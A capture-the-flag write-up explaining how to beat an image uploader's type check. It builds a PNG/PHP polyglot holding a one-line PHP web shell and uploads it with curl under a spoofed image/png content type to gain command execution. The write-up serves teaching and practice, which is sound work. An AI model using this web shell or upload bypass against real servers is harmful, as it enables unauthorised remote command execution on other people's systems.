# Writeup
It says "Image uploader", and the goal is to upload `attack.php`. `sample.png` is just for checking the normal behavior.

The uploader only accepts images, so it checks the file "type" somewhere. The title "Type Spoofing" is the hint: we spoof that type check.

The usual checks are one (or more) of:
- the `Content-Type` of the multipart part
- the magic bytes at the head of the file (e.g. `getimagesize` / `finfo`)
- the extension

The trick is to make a file that *looks* like an image for the check but is still PHP for the server. So I take `sample.png` (or just a valid PNG/GIF header) and append the PHP payload after it, then upload it so the real content type check passes but the saved file runs as PHP.

```bash
# make a polyglot: real image header + php payload
cp sample.png attack.php
printf '<?php system($_GET["c"]); ?>' >> attack.php

# upload it, spoofing the content type to image/png
curl -F 'file=@attack.php;type=image/png' http://web.katagaitai-ctf.net/http/step4.php
```

Since the head still has the image magic bytes, the "is this an image?" check passes, but the saved `.php` is executed by PHP. Hitting the uploaded file then gives command execution / the flag.

# flag
```
katagaitai-CTF{...}
```
